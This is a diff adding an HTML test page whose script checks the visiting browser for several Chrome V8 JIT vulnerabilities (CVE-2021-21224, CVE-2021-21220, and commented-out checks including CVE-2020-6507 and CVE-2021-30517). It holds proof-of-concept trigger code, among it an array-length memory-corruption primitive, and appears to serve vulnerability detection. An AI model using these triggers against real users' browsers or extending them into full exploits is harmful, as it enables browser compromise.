@@ -1,0 +1,140 @@
+<html>
+
+<body>
+    <h1> test </h1>
+    <script>
+    function print(text){
+        document.write(text+"<br>");
+    }
+
+    print(navigator.userAgent);
+    //---------------------------------------------------------------------------------
+    function cve_2021_21224(b) {
+        let x = -1;
+        if (b) x = 0xFFFFFFFF;
+        return -1 < Math.max(0, x, -1);
+    }
+    var v1 = cve_2021_21224(true);
+    for(var i = 0;i < 20000;i++){
+        cve_2021_21224(false);
+    }
+
+
+    var v2 = cve_2021_21224(true);
+    if(v1 != v2){
+        alert("[!]cve_2021_21224")
+    }
+
+    //-----------------------------------------------------------------------------
+    // function cve_2021_30599(a) {
+    //     return ((a & 1) == 1) & ((a & 2) == 1);
+    // }
+
+
+
+    // var v1 = cve_2021_30599(1);
+    // for (var i = 0; i < 10**4; i++) cve_2021_30599(1);
+    // var v2 = cve_2021_30599(1);
+    // if(v1 != v2){
+    //     alert("[!] cve_2021_30599")
+    // }
+
+    // //-------------------------------------------------------------------------------
+    // function cve_2021_30598(a,b) {
+    //     a = a|0;
+    //     b = b|0;
+    //     return (a >>> b) ^ (a << (32-b));
+    // }
+
+    // var v1 = cve_2021_30598(1,0);
+    // for (var i = 0; i < 10**4; i++) cve_2021_30598(1,0);
+    // var v2 = cve_2021_30598(1,0);
+    // if(v1 != v2){
+    //     alert("[!] cve_2021_30598")
+    // }
+    //--------------------------------------------------------------------------------
+    
+
+    // array = Array(0x40000).fill(1.1);
+    // args = Array(0x100 - 1).fill(array);
+    // args.push(Array(0x40000 - 4).fill(2.2));
+    // giant_array = Array.prototype.concat.apply([], args);
+    // giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);
+
+    // length_as_double =
+    //     new Float64Array(new BigUint64Array([0x2424242400000000n]).buffer)[0];
+
+    // function trigger(array) {
+    //     var x = array.length;
+    //     x -= 67108861;
+    //     x = Math.max(x, 0);
+    //     x *= 6;
+    //     x -= 5;
+    //     x = Math.max(x, 0);
+
+    //     let corrupting_array = [0.1, 0.1];
+    //     let corrupted_array = [0.1];
+
+    //     corrupting_array[x] = length_as_double;
+    //     return [corrupting_array, corrupted_array];
+    // }
+
+    // for (let i = 0; i < 3000; ++i) {
+    //     trigger(giant_array);
+    // }
+
+    // corrupted_array = trigger(giant_array)[1];
+    // if(corrupted_array.length != 1){
+    //     alert("[!]cve-2020-6507")
+    //     alert('corrupted array length: ' + corrupted_array.length.toString(16));
+    // }
+    //------------------------------------------------------------------------------------
+    // obj = {a:1};
+    // obj_array = [obj];
+    // function main() {
+    //     class C {
+    //         m() {
+    //             return super.length;
+    //         }
+    //     }
+    //     f = new String("aaaa");
+    //     C.prototype.__proto__ = f
+
+    //     let c = new C()
+    //     c.x0 = obj_array;
+    //     f.length;
+    //     return c.m();
+    // }
+    // for (let i = 0; i < 0x100; ++i) {
+    //     r = main()
+    //     if (r != 4) {
+    //         alert("[!]cve-2021-30517");
+    //         break;
+    //     }
+    // }
+    //--------------------------------------------------------------------------------------
+    const _arr = new Uint32Array([2**31]);
+
+    function foo(a) {
+    var x = 1;
+    x = (_arr[0] ^ 0) + 1;
+    return x;
+    }
+
+
+    var v1 = foo(true);
+    for(var i = 0;i < 20000;i++){
+        foo(false)
+    }
+    var v2 = foo(true);
+    console.log(v1,v2);
+    if(v1 != v2){
+        alert("[!]cve-2021-21220");
+    }
+
+
+
+</script>
+</body>
+
+</html>
